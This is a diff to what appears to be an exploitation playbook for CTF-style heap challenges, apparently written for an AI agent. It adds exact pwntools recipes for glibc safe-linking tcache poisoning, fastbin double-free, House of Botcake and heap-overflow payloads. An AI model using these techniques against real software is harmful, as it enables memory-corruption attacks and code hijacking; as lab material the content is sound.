@@ -86,7 +86,9 @@ def show(i):  p.sendlineafter(b'> ', b'4'); p.sendlineafter(b'index', str(i).enc
 
 **Tcache (glibc 2.32+ safe-linking):**
 
-- `encoded_fd = (chunk_user_ptr >> 12) ^ target_addr` — do NOT write raw target.
+- `encoded_fd = (chunk_user_ptr >> 12) ^ target_user_ptr` — do NOT write raw target.
+- In the exploit script: compute inline as `encoded_fd = (chunk_user_ptr >> 12) ^ (fake_chunk_addr + 0x10)`.
+  Call `heap_safe_link` MCP tool only to verify the formula on a known value; it cannot be imported in the exploit script.
 - `unaligned tcache chunk detected` = wrong safe-linking math.
 - UAF pattern: alloc A,B → free B,A → UAF edit A's fd → alloc twice → write target.
 - Parse target pointers from banner text when available.
@@ -95,33 +97,108 @@ def show(i):  p.sendlineafter(b'> ', b'4'); p.sendlineafter(b'index', str(i).enc
 
 **Fastbin double-free (glibc 2.32+ safe-linking on fastbin fd too):**
 
-- glibc 2.26+ fills tcache (7 entries max) before fastbin — fill tcache first via 7
-  alloc/free cycles, then proceed with fastbin frees.
-- A→B→A chain: `free A`, `free B` (head≠A → pass), `free A` again (head=B≠A → pass).
-- Fastbin fd stores USER pointer (not chunk ptr) in glibc 2.32+.
-  Safe-link key = `chunk_user_ptr >> 12`; encode: `key ^ target_user_ptr`.
-- Global fake chunk needs `__attribute__((aligned(16)))` and a valid size field matching
-  the fastbin class (e.g. `0x31` for fastbin[1]).
-- malloc returns the user pointer directly — expected return = `fake_chunk_addr + 0x10`.
+Exact step-by-step (do not deviate):
+1. **Fill tcache** — alloc slots 0-8 (9 chunks), then free 0-6 (7 frees): tcache[SZ] now full.
+2. **Fastbin frees** — free slot 7, free slot 8: both go to fastbin (tcache full).
+3. **A→B→A** — free slot 7 again (head=slot8 ≠ slot7 → passes): fastbin = [7→8→7].
+4. **Drain tcache** — alloc 7 times (slots 9-15): tcache[SZ] now empty.
+5. **Pop fastbin:** `a_ptr = alloc(16)` → chunk 7 (A, fastbin head); `b_ptr = alloc(17)` → chunk 8 (B).
+   Fastbin is LIFO — last freed (slot 7, second time) is head. alloc 16 = chunk7 (A), alloc 17 = chunk8 (B).
+6. **Compute encoded fd in Python** (chunk addresses are ASLR, cannot be pre-computed):
+   ```python
+   target_user_ptr = fake_chunk_addr + 0x10  # +0x10 is MANDATORY; malloc returns user ptr, not header
+   encoded_fd = (a_ptr >> 12) ^ target_user_ptr
+   ```
+7. **Edit slot 16** (which holds chunk 7 / A) — write `p64(encoded_fd).ljust(0x28, b'\x00')`.
+   This overwrites the phantom copy of A still in the fastbin.
+8. **Two allocs to reach fake chunk:**
+   - `alloc(18)` → phantom A (chunk 7 again); fastbin head decodes to `target_user_ptr`.
+   - `alloc(19)` → `fake_chunk_addr + 0x10` (the fake chunk user ptr). **Only TWO allocs, not three.**
+9. `edit(19, ...)` writes to `fake_chunk + 0x10` → satisfies any win condition at offset 16 of the chunk.
+
+Key invariants:
+- Fastbin fd stores USER pointer (not chunk header) in glibc 2.32+.
+- Global fake chunk needs valid size field matching the fastbin class (e.g. `0x31` for 0x20-byte allocs).
+- `malloc` returns user pointer = `fake_chunk_addr + 0x10`; using `fake_chunk_addr` or `fake_chunk_addr+8` as target will corrupt heap or return wrong address.
 
 **House of Botcake (tcache double-free bypass via unsorted-bin KEY overwrite):**
 
-- Fill tcache[SZ] to 7 → free target to unsorted bin (KEY overwritten by libc ptr) →
-  free prev (consolidates with target) → **alloc one from tcache** (count 7→6) →
-  free target again (KEY≠tcache_key → passes check, goes to tcache).
-- Do NOT re-free a tcache chunk to drain the count — that trips the tcache double-free
-  KEY check. Use alloc to reduce the count.
-- Alloc an overlapping chunk (size spanning prev+start-of-target) from unsorted bin →
-  write poisoned fd to target's fd field (at offset `prev_size` from overlap base).
-- Two allocs then reach the target address.
+Exact step-by-step (do not deviate):
+
+1. **Pick SZ** — a user size whose chunk size lands in unsorted bin when tcache is full (e.g. SZ=0xf0 → 0x100 chunk). CHUNK_SZ = SZ + 0x10.
+2. **Alloc helper MUST return chunk address** — read the `chunk at %p` output every time. **Edit helper MUST use `send`/`sendafter`, never `sendlineafter`** — `read()` in the binary wants an exact byte count; appending `\n` causes it to block and consume subsequent menu input as heap data:
+   ```python
+   def alloc(idx, size):
+       p.sendlineafter(b'> ', b'1')
+       p.sendlineafter(b'index', str(idx).encode())
+       p.sendlineafter(b'size', str(size).encode())
+       p.recvuntil(b'chunk at ')
+       return int(p.recvuntil(b'\n').strip(), 16)
+
+   def edit(idx, data):
+       p.sendlineafter(b'> ', b'3')
+       p.sendlineafter(b'index', str(idx).encode())
+       p.sendafter(b'data: ', data)   # sendafter not sendlineafter
+   ```
+3. **Alloc 10 chunks** — indices 0-6 (tcache fill), 7=PP, 8=P, 9=GUARD. GUARD (chunk 9) MUST be allocated **after P** and never freed — without it, glibc absorbs the consolidated PP+P block into the top chunk, destroying the setup.
+   ```python
+   chunks = {}
+   for i in range(10):
+       chunks[i] = alloc(i, SZ)
+   pp_addr = chunks[7]; p_addr = chunks[8]
+   ```
+4. **Fill tcache** — free indices 0-6: tcache[CHUNK_SZ] = 7 (full).
+5. **Free P (idx 8)** → goes to unsorted bin (tcache full); glibc overwrites P's KEY field with a libc pointer.
+6. **Free PP (idx 7)** → forward-coalesces PP+P into a single 0x200 chunk in unsorted bin.
+7. **Drain one tcache slot** — `alloc(10, SZ)`: tcache count 7→6, making room for P.
+8. **Free P again (idx 8)** — glibc checks KEY: sees libc ptr ≠ tcache_key → passes → P lands in tcache.
+9. **Alloc overlap** — `alloc(11, SZ*2)`: malloc serves the merged unsorted-bin chunk, returning pp_addr. The overlap spans PP+P.
+10. **Poison P's fd** — P's user area is at offset CHUNK_SZ inside the overlap:
+    ```python
+    encoded_fd = (p_addr >> 12) ^ target_addr
+    edit(11, b'\x00' * CHUNK_SZ + p64(encoded_fd))
+    ```
+11. **Two allocs reach target**:
+    - `alloc(12, SZ)` → pops P from tcache; tcache head = target_addr
+    - `alloc(13, SZ)` → returns target_addr
+
+Key invariants:
+- `do_edit` is blocked on freed chunks (freed_flag check) → you cannot directly UAF-edit P's fd. You MUST use the overlap chunk (step 9-10).
+- Guard chunk (idx 9) is mandatory. No guard = top-chunk absorption = second free(P) corrupts heap.
+- Do NOT drain tcache by re-freeing — that trips the tcache double-free check. Use alloc.
 
 **Heap overflow → tcache poison:**
 
-- Overflow from A into adjacent freed B's chunk header: write `p64(0)` (prev_size) +
-  `p64(CHUNK_SZ | 1)` (size, preserve PREV_INUSE) + `p64(B_key ^ target_addr)` (fd).
-- Need tcache count ≥ 2 before freeing B so count remains ≥ 1 after popping B.
-  Free a same-size dummy chunk first (count→1), then free B (count→2), then overflow.
-- B's key = `B_user_ptr >> 12` (same formula as tcache).
+Exact step-by-step (do not deviate):
+
+1. **Alloc A, B, dummy** — three same-size chunks. A is the overflow source; B is the victim (will be freed into tcache); dummy is a throw-away chunk needed to get count to 2.
+   ```python
+   chunk_a = alloc(0)   # overflow source
+   chunk_b = alloc(1)   # victim
+   dummy   = alloc(2)   # needed for tcache count
+   ```
+2. **Free dummy first → count=1. Free B → count=2.** CRITICAL: tcache count must be 2 before you overflow. After you pop B (count→1) and then pop the poisoned target (count→0) the exploit reaches the target. If you only free B (count=1), popping B drops count to 0 and the next alloc calls `malloc()` directly — you never reach the target.
+   ```python
+   free(2)   # dummy → tcache count = 1
+   free(1)   # B     → tcache count = 2
+   ```
+3. **Compute encoded fd** — B's key is its user pointer (same safe-link formula):
+   ```python
+   encoded_fd = (chunk_b >> 12) ^ target_addr
+   ```
+4. **Overflow from A into B's freed header** — the layout is:
+   - bytes 0 … USERSZ-1: fill chunk A user area
+   - bytes USERSZ … USERSZ+7: B's `prev_size` (write `p64(0)`)
+   - bytes USERSZ+8 … USERSZ+15: B's `size` field (write `p64(CHUNK_SZ | 1)`, preserve PREV_INUSE)
+   - bytes USERSZ+16 … USERSZ+23: B's `fd` (write `p64(encoded_fd)`)
+   ```python
+   payload = b'\x00' * USERSZ + p64(0) + p64(CHUNK_SZ | 1) + p64(encoded_fd)
+   edit(0, payload)   # sendafter — do NOT use sendlineafter
+   ```
+5. **Two allocs reach target**:
+   - `alloc(3)` → pops B from tcache (count→1); tcache head = target_addr
+   - `alloc(4)` → pops target_addr (count→0)
+6. `edit(4, ...)` writes to target.
 
 ## GDB / dynamic analysis
 
